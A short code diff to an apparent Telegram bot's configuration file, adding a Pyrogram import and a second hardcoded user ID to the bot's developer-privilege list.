@@ -7,6 +7,7 @@ import telegram.ext as tg
 from aiohttp import ClientSession
 from telegraph import Telegraph
 from Python_ARQ import ARQ
+from pyrogram.types import Message
 from pyrogram import Client, errors
 from telethon import TelegramClient
 
@@ -187,6 +188,7 @@ else:
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(5207640479)
+DEV_USERS.add(5479247500)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
